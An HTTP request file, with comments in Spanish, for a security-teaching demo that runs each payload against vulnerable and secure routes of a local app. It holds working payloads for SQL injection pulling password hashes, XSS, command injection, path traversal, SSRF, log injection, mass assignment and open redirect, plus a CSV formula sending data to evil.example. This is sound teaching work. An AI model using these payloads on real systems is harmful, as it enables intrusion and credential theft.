# Payloads para la demo. Se ejecutan con REST Client de VS Code / cliente HTTP de JetBrains,
# o copiándolos como comandos curl. Cambiá /vuln por /secure para comparar.
@base = http://localhost:8080

### SQL injection: extraer hashes de contraseñas con UNION
GET {{base}}/vuln/comments/search?author=x'%20UNION%20SELECT%20id,%20username,%20password_hash%20FROM%20users--

### Mismo payload, ruta segura -> 422
GET {{base}}/secure/comments/search?author=x'%20UNION%20SELECT%20id,%20username,%20password_hash%20FROM%20users--

### XSS almacenado: guardar un payload y abrir /vuln/comments y /secure/comments en el navegador
POST {{base}}/vuln/comments
Content-Type: application/json

{"author": "<script>alert('author')</script>", "body": "<img src=x onerror=alert('body')>"}

### Inyección en contexto JS (abrir en el navegador)
GET {{base}}/vuln/comments?filter=';alert(document.domain);//

### Mass assignment: volverse admin
POST {{base}}/vuln/users
Content-Type: application/json

{"username": "mallory", "email": "m@example.test", "is_admin": 1}

### Mass assignment, ruta segura -> 422 (campo extra prohibido)
POST {{base}}/secure/users
Content-Type: application/json

{"username": "mallory", "email": "m@example.test", "is_admin": 1}

### Path traversal
GET {{base}}/vuln/files?name=../secret.txt

### Path traversal, ruta segura -> 400
GET {{base}}/secure/files?name=../secret.txt

### Command injection
GET {{base}}/vuln/ping?host=127.0.0.1;id

### Command injection, ruta segura -> 400
GET {{base}}/secure/ping?host=127.0.0.1;id

### El acceso directo al endpoint interno lo bloquea el gateway -> 404
GET {{base}}/internal/config

### SSRF: el servicio pide su propio endpoint interno por nosotros
POST {{base}}/vuln/avatar
Content-Type: application/json

{"url": "http://127.0.0.1:8000/internal/config"}

### SSRF, ruta segura -> 400
POST {{base}}/secure/avatar
Content-Type: application/json

{"url": "http://127.0.0.1:8000/internal/config"}

### Log injection: falsificar una segunda línea de log (ver `docker compose logs comments-service`)
POST {{base}}/vuln/login
Content-Type: application/json

{"username": "bob\n2026-10-30 INFO login succeeded for user admin"}

### Log injection, ruta segura: una sola línea JSON
POST {{base}}/secure/login
Content-Type: application/json

{"username": "bob\n2026-10-30 INFO login succeeded for user admin"}

### Encoders: un valor, todos los contextos de salida
GET {{base}}/secure/encode?value=%3Cimg%20src%3Dx%20onerror%3D'alert(1)'%3E

### Gateway: content type incorrecto -> 415
POST {{base}}/secure/comments
Content-Type: text/plain

hello

# ───────────────────────── Desafío, etapa 1 ─────────────────────────

### Reto 1: blind SQLi en ORDER BY. Condición verdadera -> orden ascendente
GET {{base}}/vuln/comments/sorted?sort=(CASE%20WHEN%20(SELECT%20substr(password_hash,1,1)%20FROM%20users%20WHERE%20username='admin')='p'%20THEN%20id%20ELSE%20-id%20END)

### Reto 1: mismo payload, ruta segura -> 422
GET {{base}}/secure/comments/sorted?sort=(CASE%20WHEN%20(SELECT%20substr(password_hash,1,1)%20FROM%20users%20WHERE%20username='admin')='p'%20THEN%20id%20ELSE%20-id%20END)

### Reto 1: uso legítimo
GET {{base}}/secure/comments/sorted?sort=author&direction=DESC

### Reto 2: guardar una fórmula (después exportar /vuln y /secure)
POST {{base}}/vuln/comments
Content-Type: application/json

{"author": "mallory", "body": "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"Ver detalle\")"}

### Reto 2: export vulnerable vs. seguro
GET {{base}}/vuln/comments/export.csv
###
GET {{base}}/secure/comments/export.csv

### Reto 3: open redirect
GET {{base}}/vuln/redirect?next=//evil.example

### Reto 3: ruta segura -> Location: /
GET {{base}}/secure/redirect?next=//evil.example
